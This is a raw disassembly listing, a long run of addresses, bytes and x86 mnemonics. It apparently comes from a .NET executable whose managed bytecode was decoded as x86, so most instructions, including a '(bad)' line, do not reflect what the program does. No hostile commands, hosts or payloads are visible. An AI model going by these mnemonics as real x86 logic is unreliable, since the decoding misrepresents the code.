  404745:	81 29 00 00 07 72    	subl   $0x72070000,(%ecx)
  40474b:	f0 11 00             	lock adc %eax,(%eax)
  40474e:	70 28                	jo     0x404778
  404750:	8c 00                	mov    %es,(%eax)
  404752:	00 0a                	add    %cl,(%edx)
  404754:	3a 32                	cmp    (%edx),%dh
  404756:	28 00                	sub    %al,(%eax)
  404758:	00 38                	add    %bh,(%eax)
  40475a:	6c                   	insb   (%dx),%es:(%edi)
  40475b:	29 00                	sub    %eax,(%eax)
  40475d:	00 07                	add    %al,(%edi)
  40475f:	72 fe                	jb     0x40475f
  404761:	11 00                	adc    %eax,(%eax)
  404763:	70 28                	jo     0x40478d
  404765:	8c 00                	mov    %es,(%eax)
  404767:	00 0a                	add    %cl,(%edx)
  404769:	3a 29                	cmp    (%ecx),%ch
  40476b:	28 00                	sub    %al,(%eax)
  40476d:	00 38                	add    %bh,(%eax)
  40476f:	57                   	push   %edi
  404770:	29 00                	sub    %eax,(%eax)
  404772:	00 07                	add    %al,(%edi)
  404774:	72 12                	jb     0x404788
  404776:	12 00                	adc    (%eax),%al
  404778:	70 28                	jo     0x4047a2
  40477a:	8c 00                	mov    %es,(%eax)
  40477c:	00 0a                	add    %cl,(%edx)
  40477e:	3a 20                	cmp    (%eax),%ah
  404780:	28 00                	sub    %al,(%eax)
  404782:	00 38                	add    %bh,(%eax)
  404784:	42                   	inc    %edx
  404785:	29 00                	sub    %eax,(%eax)
  404787:	00 07                	add    %al,(%edi)
  404789:	72 1c                	jb     0x4047a7
  40478b:	12 00                	adc    (%eax),%al
  40478d:	70 28                	jo     0x4047b7
  40478f:	8c 00                	mov    %es,(%eax)
  404791:	00 0a                	add    %cl,(%edx)
  404793:	3a 17                	cmp    (%edi),%dl
  404795:	28 00                	sub    %al,(%eax)
  404797:	00 38                	add    %bh,(%eax)
  404799:	2d 29 00 00 07       	sub    $0x7000029,%eax
  40479e:	72 28                	jb     0x4047c8
  4047a0:	12 00                	adc    (%eax),%al
  4047a2:	70 28                	jo     0x4047cc
  4047a4:	8c 00                	mov    %es,(%eax)
  4047a6:	00 0a                	add    %cl,(%edx)
  4047a8:	3a 0e                	cmp    (%esi),%cl
  4047aa:	28 00                	sub    %al,(%eax)
  4047ac:	00 38                	add    %bh,(%eax)
  4047ae:	18 29                	sbb    %ch,(%ecx)
  4047b0:	00 00                	add    %al,(%eax)
  4047b2:	07                   	pop    %es
  4047b3:	72 38                	jb     0x4047ed
  4047b5:	12 00                	adc    (%eax),%al
  4047b7:	70 28                	jo     0x4047e1
  4047b9:	8c 00                	mov    %es,(%eax)
  4047bb:	00 0a                	add    %cl,(%edx)
  4047bd:	3a 05 28 00 00 38    	cmp    0x38000028,%al
  4047c3:	03 29                	add    (%ecx),%ebp
  4047c5:	00 00                	add    %al,(%eax)
  4047c7:	07                   	pop    %es
  4047c8:	72 4c                	jb     0x404816
  4047ca:	12 00                	adc    (%eax),%al
  4047cc:	70 28                	jo     0x4047f6
  4047ce:	8c 00                	mov    %es,(%eax)
  4047d0:	00 0a                	add    %cl,(%edx)
  4047d2:	3a f8                	cmp    %al,%bh
  4047d4:	27                   	daa
  4047d5:	00 00                	add    %al,(%eax)
  4047d7:	38 ee                	cmp    %ch,%dh
  4047d9:	28 00                	sub    %al,(%eax)
  4047db:	00 07                	add    %al,(%edi)
  4047dd:	72 60                	jb     0x40483f
  4047df:	12 00                	adc    (%eax),%al
  4047e1:	70 28                	jo     0x40480b
  4047e3:	8c 00                	mov    %es,(%eax)
  4047e5:	00 0a                	add    %cl,(%edx)
  4047e7:	3a eb                	cmp    %bl,%ch
  4047e9:	27                   	daa
  4047ea:	00 00                	add    %al,(%eax)
  4047ec:	38 d9                	cmp    %bl,%cl
  4047ee:	28 00                	sub    %al,(%eax)
  4047f0:	00 07                	add    %al,(%edi)
  4047f2:	72 70                	jb     0x404864
  4047f4:	12 00                	adc    (%eax),%al
  4047f6:	70 28                	jo     0x404820
  4047f8:	8c 00                	mov    %es,(%eax)
  4047fa:	00 0a                	add    %cl,(%edx)
  4047fc:	3a de                	cmp    %dh,%bl
  4047fe:	27                   	daa
  4047ff:	00 00                	add    %al,(%eax)
  404801:	38 c4                	cmp    %al,%ah
  404803:	28 00                	sub    %al,(%eax)
  404805:	00 07                	add    %al,(%edi)
  404807:	72 7a                	jb     0x404883
  404809:	12 00                	adc    (%eax),%al
  40480b:	70 28                	jo     0x404835
  40480d:	8c 00                	mov    %es,(%eax)
  40480f:	00 0a                	add    %cl,(%edx)
  404811:	3a d5                	cmp    %ch,%dl
  404813:	27                   	daa
  404814:	00 00                	add    %al,(%eax)
  404816:	38 af 28 00 00 07    	cmp    %ch,0x7000028(%edi)
  40481c:	72 8c                	jb     0x4047aa
  40481e:	12 00                	adc    (%eax),%al
  404820:	70 28                	jo     0x40484a
  404822:	8c 00                	mov    %es,(%eax)
  404824:	00 0a                	add    %cl,(%edx)
  404826:	3a cc                	cmp    %ah,%cl
  404828:	27                   	daa
  404829:	00 00                	add    %al,(%eax)
  40482b:	38 9a 28 00 00 07    	cmp    %bl,0x7000028(%edx)
  404831:	72 98                	jb     0x4047cb
  404833:	12 00                	adc    (%eax),%al
  404835:	70 28                	jo     0x40485f
  404837:	8c 00                	mov    %es,(%eax)
  404839:	00 0a                	add    %cl,(%edx)
  40483b:	3a c3                	cmp    %bl,%al
  40483d:	27                   	daa
  40483e:	00 00                	add    %al,(%eax)
  404840:	38 85 28 00 00 07    	cmp    %al,0x7000028(%ebp)
  404846:	72 ac                	jb     0x4047f4
  404848:	12 00                	adc    (%eax),%al
  40484a:	70 28                	jo     0x404874
  40484c:	8c 00                	mov    %es,(%eax)
  40484e:	00 0a                	add    %cl,(%edx)
  404850:	3a ba 27 00 00 38    	cmp    0x38000027(%edx),%bh
  404856:	70 28                	jo     0x404880
  404858:	00 00                	add    %al,(%eax)
  40485a:	07                   	pop    %es
  40485b:	72 be                	jb     0x40481b
  40485d:	12 00                	adc    (%eax),%al
  40485f:	70 28                	jo     0x404889
  404861:	8c 00                	mov    %es,(%eax)
  404863:	00 0a                	add    %cl,(%edx)
  404865:	3a 04 28             	cmp    (%eax,%ebp,1),%al
  404868:	00 00                	add    %al,(%eax)
  40486a:	38 5b 28             	cmp    %bl,0x28(%ebx)
  40486d:	00 00                	add    %al,(%eax)
  40486f:	02 7b 3f             	add    0x3f(%ebx),%bh
  404872:	00 00                	add    %al,(%eax)
  404874:	04 2c                	add    $0x2c,%al
  404876:	0e                   	push   %cs
  404877:	02 7b 3e             	add    0x3e(%ebx),%bh
  40487a:	00 00                	add    %al,(%eax)
  40487c:	04 14                	add    $0x14,%al
  40487e:	28 87 00 00 0a 2c    	sub    %al,0x2c0a0000(%edi)
  404884:	0b 72 d0             	or     -0x30(%edx),%esi
  404887:	12 00                	adc    (%eax),%al
  404889:	70 28                	jo     0x4048b3
  40488b:	53                   	push   %ebx
  40488c:	00 00                	add    %al,(%eax)
  40488e:	0a 2a                	or     (%edx),%ch
  404890:	00 02                	add    %al,(%edx)
  404892:	7b 3e                	jnp    0x4048d2
  404894:	00 00                	add    %al,(%eax)
  404896:	04 72                	add    $0x72,%al
  404898:	a0 06 00 70 16       	mov    0x16700006,%al
  40489d:	17                   	pop    %ss
  40489e:	6f                   	outsl  %ds:(%esi),(%dx)
  40489f:	78 00                	js     0x4048a1
  4048a1:	00 0a                	add    %cl,(%edx)
  4048a3:	25 2d 04 26 14       	and    $0x1426042d,%eax
  4048a8:	2b 0c 72             	sub    (%edx,%esi,2),%ecx
  4048ab:	3a 08                	cmp    (%eax),%cl
  4048ad:	00 70 1f             	add    %dh,0x1f(%eax)
  4048b0:	19 28                	sbb    %ebp,(%eax)
  4048b2:	88 00                	mov    %al,(%eax)
  4048b4:	00 0a                	add    %cl,(%edx)
  4048b6:	0d 09 14 28 89       	or     $0x89281409,%eax
  4048bb:	00 00                	add    %al,(%eax)
  4048bd:	0a 2c 3a             	or     (%edx,%edi,1),%ch
  4048c0:	02 7b 3d             	add    0x3d(%ebx),%bh
  4048c3:	00 00                	add    %al,(%eax)
  4048c5:	04 73                	add    $0x73,%al
  4048c7:	0d 00 00 06 13       	or     $0x13060000,%eax
  4048cc:	04 09                	add    $0x9,%al
  4048ce:	14 18                	adc    $0x18,%al
  4048d0:	8d 02                	lea    (%edx),%eax
  4048d2:	00 00                	add    %al,(%eax)
  4048d4:	01 25 16 11 04 a2    	add    %esp,0xa2041116
  4048da:	25 17 72 24 13       	and    $0x13247217,%eax
  4048df:	00 70 06             	add    %dh,0x6(%eax)
  4048e2:	72 32                	jb     0x404916
  4048e4:	13 00                	adc    (%eax),%eax
  4048e6:	70 6f                	jo     0x404957
  4048e8:	5b                   	pop    %ebx
  4048e9:	00 00                	add    %al,(%eax)
  4048eb:	0a 28                	or     (%eax),%ch
  4048ed:	3b 00                	cmp    (%eax),%eax
  4048ef:	00 0a                	add    %cl,(%edx)
  4048f1:	a2 6f 7b 00 00       	mov    %al,0x7b6f
  4048f6:	0a 26                	or     (%esi),%ah
  4048f8:	2b 0a                	sub    (%edx),%ecx
  4048fa:	72 4a                	jb     0x404946
  4048fc:	08 00                	or     %al,(%eax)
  4048fe:	70 28                	jo     0x404928
  404900:	53                   	push   %ebx
  404901:	00 00                	add    %al,(%eax)
  404903:	0a dd                	or     %ch,%bl
  404905:	f8                   	clc
  404906:	27                   	daa
  404907:	00 00                	add    %al,(%eax)
  404909:	13 05 72 42 13 00    	adc    0x134272,%eax
  40490f:	70 11                	jo     0x404922
  404911:	05 25 2d 04 26       	add    $0x26042d25,%eax
  404916:	14 2b                	adc    $0x2b,%al
  404918:	05 6f 3a 00 00       	add    $0x3a6f,%eax
  40491d:	0a 28                	or     (%eax),%ch
  40491f:	3b 00                	cmp    (%eax),%eax
  404921:	00 0a                	add    %cl,(%edx)
  404923:	28 53 00             	sub    %dl,0x0(%ebx)
  404926:	00 0a                	add    %cl,(%edx)
  404928:	dd d4                	fst    %st(4)
  40492a:	27                   	daa
  40492b:	00 00                	add    %al,(%eax)
  40492d:	02 7b 3f             	add    0x3f(%ebx),%bh
  404930:	00 00                	add    %al,(%eax)
  404932:	04 2c                	add    $0x2c,%al
  404934:	0e                   	push   %cs
  404935:	02 7b 3e             	add    0x3e(%ebx),%bh
  404938:	00 00                	add    %al,(%eax)
  40493a:	04 14                	add    $0x14,%al
  40493c:	28 87 00 00 0a 2c    	sub    %al,0x2c0a0000(%edi)
  404942:	0b 72 70             	or     0x70(%edx),%esi
  404945:	13 00                	adc    (%eax),%eax
  404947:	70 28                	jo     0x404971
  404949:	53                   	push   %ebx
  40494a:	00 00                	add    %al,(%eax)
  40494c:	0a 2a                	or     (%edx),%ch
  40494e:	00 02                	add    %al,(%edx)
  404950:	7b 3e                	jnp    0x404990
  404952:	00 00                	add    %al,(%eax)
  404954:	04 72                	add    $0x72,%al
  404956:	a0 06 00 70 16       	mov    0x16700006,%al
  40495b:	17                   	pop    %ss
  40495c:	6f                   	outsl  %ds:(%esi),(%dx)
  40495d:	78 00                	js     0x40495f
  40495f:	00 0a                	add    %cl,(%edx)
  404961:	25 2d 04 26 14       	and    $0x1426042d,%eax
  404966:	2b 0c 72             	sub    (%edx,%esi,2),%ecx
  404969:	3a 08                	cmp    (%eax),%cl
  40496b:	00 70 1f             	add    %dh,0x1f(%eax)
  40496e:	19 28                	sbb    %ebp,(%eax)
  404970:	88 00                	mov    %al,(%eax)
  404972:	00 0a                	add    %cl,(%edx)
  404974:	13 06                	adc    (%esi),%eax
  404976:	11 06                	adc    %eax,(%esi)
  404978:	14 28                	adc    $0x28,%al
  40497a:	89 00                	mov    %eax,(%eax)
  40497c:	00 0a                	add    %cl,(%edx)
  40497e:	2c 73                	sub    $0x73,%al
  404980:	02 7b 3d             	add    0x3d(%ebx),%bh
  404983:	00 00                	add    %al,(%eax)
  404985:	04 73                	add    $0x73,%al
  404987:	0d 00 00 06 13       	or     $0x13060000,%eax
  40498c:	07                   	pop    %es
  40498d:	11 06                	adc    %eax,(%esi)
  40498f:	14 18                	adc    $0x18,%al
  404991:	8d 02                	lea    (%edx),%eax
  404993:	00 00                	add    %al,(%eax)
  404995:	01 25 16 11 07 a2    	add    %esp,0xa2071116
  40499b:	25 17 1c 8d 57       	and    $0x578d1c17,%eax
  4049a0:	00 00                	add    %al,(%eax)
  4049a2:	01 25 16 72 c6 13    	add    %esp,0x13c67216
  4049a8:	00 70 a2             	add    %dh,-0x5e(%eax)
  4049ab:	25 17 06 72 d6       	and    $0xd6720617,%eax
  4049b0:	13 00                	adc    (%eax),%eax
  4049b2:	70 6f                	jo     0x404a23
  4049b4:	5b                   	pop    %ebx
  4049b5:	00 00                	add    %al,(%eax)
  4049b7:	0a a2 25 18 72 e0    	or     -0x1f8de7db(%edx),%ah
  4049bd:	13 00                	adc    (%eax),%eax
  4049bf:	70 a2                	jo     0x404963
  4049c1:	25 19 06 72 e4       	and    $0xe4720619,%eax
  4049c6:	13 00                	adc    (%eax),%eax
  4049c8:	70 6f                	jo     0x404a39
  4049ca:	5b                   	pop    %ebx
  4049cb:	00 00                	add    %al,(%eax)
  4049cd:	0a a2 25 1a 72 e0    	or     -0x1f8de5db(%edx),%ah
  4049d3:	13 00                	adc    (%eax),%eax
  4049d5:	70 a2                	jo     0x404979
  4049d7:	25 1b 06 72 f0       	and    $0xf072061b,%eax
  4049dc:	13 00                	adc    (%eax),%eax
  4049de:	70 6f                	jo     0x404a4f
  4049e0:	5b                   	pop    %ebx
  4049e1:	00 00                	add    %al,(%eax)
  4049e3:	0a a2 28 2a 00 00    	or     0x2a28(%edx),%ah
  4049e9:	0a a2 6f 7b 00 00    	or     0x7b6f(%edx),%ah
  4049ef:	0a 26                	or     (%esi),%ah
  4049f1:	2b 0a                	sub    (%edx),%ecx
  4049f3:	72 4a                	jb     0x404a3f
  4049f5:	08 00                	or     %al,(%eax)
  4049f7:	70 28                	jo     0x404a21
  4049f9:	53                   	push   %ebx
  4049fa:	00 00                	add    %al,(%eax)
  4049fc:	0a dd                	or     %ch,%bl
  4049fe:	ff 26                	jmp    *(%esi)
  404a00:	00 00                	add    %al,(%eax)
  404a02:	13 08                	adc    (%eax),%ecx
  404a04:	72 fe                	jb     0x404a04
  404a06:	13 00                	adc    (%eax),%eax
  404a08:	70 11                	jo     0x404a1b
  404a0a:	08 25 2d 04 26 14    	or     %ah,0x1426042d
  404a10:	2b 05 6f 3a 00 00    	sub    0x3a6f,%eax
  404a16:	0a 28                	or     (%eax),%ch
  404a18:	3b 00                	cmp    (%eax),%eax
  404a1a:	00 0a                	add    %cl,(%edx)
  404a1c:	28 53 00             	sub    %dl,0x0(%ebx)
  404a1f:	00 0a                	add    %cl,(%edx)
  404a21:	dd db                	fstp   %st(3)
  404a23:	26 00 00             	add    %al,%es:(%eax)
  404a26:	00 73 37             	add    %dh,0x37(%ebx)
  404a29:	00 00                	add    %al,(%eax)
  404a2b:	06                   	push   %es
  404a2c:	13 09                	adc    (%ecx),%ecx
  404a2e:	11 09                	adc    %ecx,(%ecx)
  404a30:	06                   	push   %es
  404a31:	72 2e                	jb     0x404a61
  404a33:	14 00                	adc    $0x0,%al
  404a35:	70 6f                	jo     0x404aa6
  404a37:	5d                   	pop    %ebp
  404a38:	00 00                	add    %al,(%eax)
  404a3a:	0a 7d 43             	or     0x43(%ebp),%bh
  404a3d:	00 00                	add    %al,(%eax)
  404a3f:	04 7e                	add    $0x7e,%al
  404a41:	3c 00                	cmp    $0x0,%al
  404a43:	00 04 25 2d 03 26 2b 	add    %al,0x2b26032d(,%eiz,1)
  404a4a:	05 28 42 00 00       	add    $0x4228,%eax
  404a4f:	06                   	push   %es
  404a50:	73 44                	jae    0x404a96
  404a52:	00 00                	add    %al,(%eax)
  404a54:	06                   	push   %es
  404a55:	80 3c 00 00          	cmpb   $0x0,(%eax,%eax,1)
  404a59:	04 11                	add    $0x11,%al
  404a5b:	09 fe                	or     %edi,%esi
  404a5d:	06                   	push   %es
  404a5e:	38 00                	cmp    %al,(%eax)
  404a60:	00 06                	add    %al,(%esi)
  404a62:	73 1f                	jae    0x404a83
  404a64:	00 00                	add    %al,(%eax)
  404a66:	0a 28                	or     (%eax),%ch
  404a68:	20 00                	and    %al,(%eax)
  404a6a:	00 0a                	add    %cl,(%edx)
  404a6c:	26 73 33             	es jae 0x404aa2
  404a6f:	00 00                	add    %al,(%eax)
  404a71:	0a 13                	or     (%ebx),%dl
  404a73:	0a 11                	or     (%ecx),%dl
  404a75:	0a 72 81             	or     -0x7f(%edx),%dh
  404a78:	00 00                	add    %al,(%eax)
  404a7a:	70 72                	jo     0x404aee
  404a7c:	8f 00                	pop    (%eax)
  404a7e:	00 70 6f             	add    %dh,0x6f(%eax)
  404a81:	34 00                	xor    $0x0,%al
  404a83:	00 0a                	add    %cl,(%edx)
  404a85:	11 0a                	adc    %ecx,(%edx)
  404a87:	72 9f                	jb     0x404a28
  404a89:	00 00                	add    %al,(%eax)
  404a8b:	70 72                	jo     0x404aff
  404a8d:	d3 03                	roll   %cl,(%ebx)
  404a8f:	00 70 28             	add    %dh,0x28(%eax)
  404a92:	54                   	push   %esp
  404a93:	00 00                	add    %al,(%eax)
  404a95:	0a 72 38             	or     0x38(%edx),%dh
  404a98:	14 00                	adc    $0x0,%al
  404a9a:	70 11                	jo     0x404aad
  404a9c:	09 7c 43 00          	or     %edi,0x0(%ebx,%eax,2)
  404aa0:	00 04 28             	add    %al,(%eax,%ebp,1)
  404aa3:	5f                   	pop    %edi
  404aa4:	00 00                	add    %al,(%eax)
  404aa6:	0a 28                	or     (%eax),%ch
  404aa8:	55                   	push   %ebp
  404aa9:	00 00                	add    %al,(%eax)
  404aab:	0a 6f 34             	or     0x34(%edi),%ch
  404aae:	00 00                	add    %al,(%eax)
  404ab0:	0a 02                	or     (%edx),%al
  404ab2:	7b 3d                	jnp    0x404af1
  404ab4:	00 00                	add    %al,(%eax)
  404ab6:	04 11                	add    $0x11,%al
  404ab8:	0a 6f 35             	or     0x35(%edi),%ch
  404abb:	00 00                	add    %al,(%eax)
  404abd:	0a 6f 4f             	or     0x4f(%edi),%ch
  404ac0:	00 00                	add    %al,(%eax)
  404ac2:	06                   	push   %es
  404ac3:	dd 39                	fnstsw (%ecx)
  404ac5:	26 00 00             	add    %al,%es:(%eax)
  404ac8:	13 0b                	adc    (%ebx),%ecx
  404aca:	73 33                	jae    0x404aff
  404acc:	00 00                	add    %al,(%eax)
  404ace:	0a 13                	or     (%ebx),%dl
  404ad0:	0c 11                	or     $0x11,%al
  404ad2:	0c 72                	or     $0x72,%al
  404ad4:	81 00 00 70 72 c5    	addl   $0xc5727000,(%eax)
  404ada:	01 00                	add    %eax,(%eax)
  404adc:	70 6f                	jo     0x404b4d
  404ade:	34 00                	xor    $0x0,%al
  404ae0:	00 0a                	add    %cl,(%edx)
  404ae2:	11 0c 72             	adc    %ecx,(%edx,%esi,2)
  404ae5:	9f                   	lahf
  404ae6:	00 00                	add    %al,(%eax)
  404ae8:	70 72                	jo     0x404b5c
  404aea:	d3 03                	roll   %cl,(%ebx)
  404aec:	00 70 28             	add    %dh,0x28(%eax)
  404aef:	54                   	push   %esp
  404af0:	00 00                	add    %al,(%eax)
  404af2:	0a 72 e1             	or     -0x1f(%edx),%dh
  404af5:	03 00                	add    (%eax),%eax
  404af7:	70 11                	jo     0x404b0a
  404af9:	0b 6f 77             	or     0x77(%edi),%ebp
  404afc:	00 00                	add    %al,(%eax)
  404afe:	0a 28                	or     (%eax),%ch
  404b00:	55                   	push   %ebp
  404b01:	00 00                	add    %al,(%eax)
  404b03:	0a 6f 34             	or     0x34(%edi),%ch
  404b06:	00 00                	add    %al,(%eax)
  404b08:	0a 02                	or     (%edx),%al
  404b0a:	7b 3d                	jnp    0x404b49
  404b0c:	00 00                	add    %al,(%eax)
  404b0e:	04 11                	add    $0x11,%al
  404b10:	0c 6f                	or     $0x6f,%al
  404b12:	35 00 00 0a 6f       	xor    $0x6f0a0000,%eax
  404b17:	4f                   	dec    %edi
  404b18:	00 00                	add    %al,(%eax)
  404b1a:	06                   	push   %es
  404b1b:	dd e1                	fucom  %st(1)
  404b1d:	25 00 00 00 7e       	and    $0x7e000000,%eax
  404b22:	3c 00                	cmp    $0x0,%al
  404b24:	00 04 25 2d 03 26 2b 	add    %al,0x2b26032d(,%eiz,1)
  404b2b:	05 28 42 00 00       	add    $0x4228,%eax
  404b30:	06                   	push   %es
  404b31:	73 33                	jae    0x404b66
  404b33:	00 00                	add    %al,(%eax)
  404b35:	0a 13                	or     (%ebx),%dl
  404b37:	0d 11 0d 72 81       	or     $0x81720d11,%eax
  404b3c:	00 00                	add    %al,(%eax)
  404b3e:	70 72                	jo     0x404bb2
  404b40:	8f 00                	pop    (%eax)
  404b42:	00 70 6f             	add    %dh,0x6f(%eax)
  404b45:	34 00                	xor    $0x0,%al
  404b47:	00 0a                	add    %cl,(%edx)
  404b49:	11 0d 72 9f 00 00    	adc    %ecx,0x9f72
  404b4f:	70 72                	jo     0x404bc3
  404b51:	d3 03                	roll   %cl,(%ebx)
  404b53:	00 70 28             	add    %dh,0x28(%eax)
  404b56:	54                   	push   %esp
  404b57:	00 00                	add    %al,(%eax)
  404b59:	0a 72 7a             	or     0x7a(%edx),%dh
  404b5c:	14 00                	adc    $0x0,%al
  404b5e:	70 28                	jo     0x404b88
  404b60:	38 00                	cmp    %al,(%eax)
  404b62:	00 0a                	add    %cl,(%edx)
  404b64:	6f                   	outsl  %ds:(%esi),(%dx)
  404b65:	34 00                	xor    $0x0,%al
  404b67:	00 0a                	add    %cl,(%edx)
  404b69:	02 7b 3d             	add    0x3d(%ebx),%bh
  404b6c:	00 00                	add    %al,(%eax)
  404b6e:	04 11                	add    $0x11,%al
  404b70:	0d 6f 35 00 00       	or     $0x356f,%eax
  404b75:	0a 6f 4f             	or     0x4f(%edi),%ch
  404b78:	00 00                	add    %al,(%eax)
  404b7a:	06                   	push   %es
  404b7b:	dd 81 25 00 00 13    	fldl   0x13000025(%ecx)
  404b81:	0e                   	push   %cs
  404b82:	73 33                	jae    0x404bb7
  404b84:	00 00                	add    %al,(%eax)
  404b86:	0a 13                	or     (%ebx),%dl
  404b88:	0f 11 0f             	movups %xmm1,(%edi)
  404b8b:	72 81                	jb     0x404b0e
  404b8d:	00 00                	add    %al,(%eax)
  404b8f:	70 72                	jo     0x404c03
  404b91:	c5 01                	lds    (%ecx),%eax
  404b93:	00 70 6f             	add    %dh,0x6f(%eax)
  404b96:	34 00                	xor    $0x0,%al
  404b98:	00 0a                	add    %cl,(%edx)
  404b9a:	11 0f                	adc    %ecx,(%edi)
  404b9c:	72 9f                	jb     0x404b3d
  404b9e:	00 00                	add    %al,(%eax)
  404ba0:	70 72                	jo     0x404c14
  404ba2:	d3 03                	roll   %cl,(%ebx)
  404ba4:	00 70 28             	add    %dh,0x28(%eax)
  404ba7:	54                   	push   %esp
  404ba8:	00 00                	add    %al,(%eax)
  404baa:	0a 72 e1             	or     -0x1f(%edx),%dh
  404bad:	03 00                	add    (%eax),%eax
  404baf:	70 11                	jo     0x404bc2
  404bb1:	0e                   	push   %cs
  404bb2:	6f                   	outsl  %ds:(%esi),(%dx)
  404bb3:	77 00                	ja     0x404bb5
  404bb5:	00 0a                	add    %cl,(%edx)
  404bb7:	28 55 00             	sub    %dl,0x0(%ebp)
  404bba:	00 0a                	add    %cl,(%edx)
  404bbc:	6f                   	outsl  %ds:(%esi),(%dx)
  404bbd:	34 00                	xor    $0x0,%al
  404bbf:	00 0a                	add    %cl,(%edx)
  404bc1:	02 7b 3d             	add    0x3d(%ebx),%bh
  404bc4:	00 00                	add    %al,(%eax)
  404bc6:	04 11                	add    $0x11,%al
  404bc8:	0f 6f 35 00 00 0a 6f 	movq   0x6f0a0000,%mm6
  404bcf:	4f                   	dec    %edi
  404bd0:	00 00                	add    %al,(%eax)
  404bd2:	06                   	push   %es
  404bd3:	dd 29                	(bad) (%ecx)
  404bd5:	25 00 00 02 7b       	and    $0x7b020000,%eax
  404bda:	3f                   	aas
  404bdb:	00 00                	add    %al,(%eax)
  404bdd:	04 2c                	add    $0x2c,%al
  404bdf:	0e                   	push   %cs
  404be0:	02 7b 3e             	add    0x3e(%ebx),%bh
  404be3:	00 00                	add    %al,(%eax)
  404be5:	04 14                	add    $0x14,%al
  404be7:	28 87 00 00 0a 2c    	sub    %al,0x2c0a0000(%edi)
  404bed:	0b 72 aa             	or     -0x56(%edx),%esi
  404bf0:	14 00                	adc    $0x0,%al
  404bf2:	70 28                	jo     0x404c1c
  404bf4:	53                   	push   %ebx
  404bf5:	00 00                	add    %al,(%eax)
  404bf7:	0a 2a                	or     (%edx),%ch
  404bf9:	00 02                	add    %al,(%edx)
  404bfb:	7b 3e                	jnp    0x404c3b
  404bfd:	00 00                	add    %al,(%eax)
  404bff:	04 72                	add    $0x72,%al
  404c01:	a0 06 00 70 16       	mov    0x16700006,%al
  404c06:	17                   	pop    %ss
  404c07:	6f                   	outsl  %ds:(%esi),(%dx)
  404c08:	78 00                	js     0x404c0a
  404c0a:	00 0a                	add    %cl,(%edx)
  404c0c:	25 2d 04 26 14       	and    $0x1426042d,%eax
  404c11:	2b 0c 72             	sub    (%edx,%esi,2),%ecx
  404c14:	3a 08                	cmp    (%eax),%cl
  404c16:	00 70 1f             	add    %dh,0x1f(%eax)
  404c19:	19 28                	sbb    %ebp,(%eax)
  404c1b:	88 00                	mov    %al,(%eax)
  404c1d:	00 0a                	add    %cl,(%edx)
  404c1f:	13 10                	adc    (%eax),%edx
  404c21:	11 10                	adc    %edx,(%eax)
  404c23:	14 28                	adc    $0x28,%al
  404c25:	89 00                	mov    %eax,(%eax)
  404c27:	00 0a                	add    %cl,(%edx)
  404c29:	2c 2b                	sub    $0x2b,%al
  404c2b:	02 7b 3d             	add    0x3d(%ebx),%bh
  404c2e:	00 00                	add    %al,(%eax)
  404c30:	04 73                	add    $0x73,%al
  404c32:	0d 00 00 06 13       	or     $0x13060000,%eax
  404c37:	11 11                	adc    %edx,(%ecx)
  404c39:	10 14 18             	adc    %dl,(%eax,%ebx,1)
  404c3c:	8d 02                	lea    (%edx),%eax
  404c3e:	00 00                	add    %al,(%eax)
  404c40:	01 25 16 11 11 a2    	add    %esp,0xa2111116
  404c46:	25 17 72 ac 08       	and    $0x8ac7217,%eax
  404c4b:	00 70 a2             	add    %dh,-0x5e(%eax)
  404c4e:	6f                   	outsl  %ds:(%esi),(%dx)
  404c4f:	7b 00                	jnp    0x404c51
  404c51:	00 0a                	add    %cl,(%edx)
  404c53:	26 2b 0a             	sub    %es:(%edx),%ecx
  404c56:	72 4a                	jb     0x404ca2
  404c58:	08 00                	or     %al,(%eax)
  404c5a:	70 28                	jo     0x404c84
  404c5c:	53                   	push   %ebx
  404c5d:	00 00                	add    %al,(%eax)
  404c5f:	0a dd                	or     %ch,%bl
  404c61:	9c                   	pushf
  404c62:	24 00                	and    $0x0,%al
  404c64:	00 13                	add    %dl,(%ebx)
  404c66:	12 72 fc             	adc    -0x4(%edx),%dh
  404c69:	14 00                	adc    $0x0,%al
  404c6b:	70 11                	jo     0x404c7e
  404c6d:	12 25 2d 04 26 14    	adc    0x1426042d,%ah
  404c73:	2b 05 6f 3a 00 00    	sub    0x3a6f,%eax
  404c79:	0a 28                	or     (%eax),%ch
  404c7b:	3b 00                	cmp    (%eax),%eax
  404c7d:	00 0a                	add    %cl,(%edx)
  404c7f:	28 53 00             	sub    %dl,0x0(%ebx)
  404c82:	00 0a                	add    %cl,(%edx)
  404c84:	dd 78 24             	fnstsw 0x24(%eax)
  404c87:	00 00                	add    %al,(%eax)
  404c89:	02 7b 3f             	add    0x3f(%ebx),%bh
  404c8c:	00 00                	add    %al,(%eax)
  404c8e:	04 2c                	add    $0x2c,%al
  404c90:	0e                   	push   %cs
  404c91:	02 7b 3e             	add    0x3e(%ebx),%bh
  404c94:	00 00                	add    %al,(%eax)
  404c96:	04 14                	add    $0x14,%al
  404c98:	28 87 00 00 0a 2c    	sub    %al,0x2c0a0000(%edi)
  404c9e:	0b 72 28             	or     0x28(%edx),%esi
  404ca1:	15 00 70 28 53       	adc    $0x53287000,%eax
  404ca6:	00 00                	add    %al,(%eax)
  404ca8:	0a 2a                	or     (%edx),%ch
  404caa:	00 02                	add    %al,(%edx)
  404cac:	7b 3e                	jnp    0x404cec
  404cae:	00 00                	add    %al,(%eax)
  404cb0:	04 72                	add    $0x72,%al
  404cb2:	a0 06 00 70 16       	mov    0x16700006,%al
  404cb7:	17                   	pop    %ss
  404cb8:	6f                   	outsl  %ds:(%esi),(%dx)
  404cb9:	78 00                	js     0x404cbb
  404cbb:	00 0a                	add    %cl,(%edx)
  404cbd:	25 2d 04 26 14       	and    $0x1426042d,%eax
  404cc2:	2b 0c 72             	sub    (%edx,%esi,2),%ecx
  404cc5:	3a 08                	cmp    (%eax),%cl
  404cc7:	00 70 1f             	add    %dh,0x1f(%eax)
  404cca:	19 28                	sbb    %ebp,(%eax)
  404ccc:	88 00                	mov    %al,(%eax)
  404cce:	00 0a                	add    %cl,(%edx)
  404cd0:	13 13                	adc    (%ebx),%edx
  404cd2:	11 13                	adc    %edx,(%ebx)
  404cd4:	14 28                	adc    $0x28,%al
  404cd6:	89 00                	mov    %eax,(%eax)
  404cd8:	00 0a                	add    %cl,(%edx)
  404cda:	2c 2b                	sub    $0x2b,%al
  404cdc:	02 7b 3d             	add    0x3d(%ebx),%bh
  404cdf:	00 00                	add    %al,(%eax)
  404ce1:	04 73                	add    $0x73,%al
  404ce3:	0d 00 00 06 13       	or     $0x13060000,%eax
  404ce8:	14 11                	adc    $0x11,%al
  404cea:	13 14 18             	adc    (%eax,%ebx,1),%edx
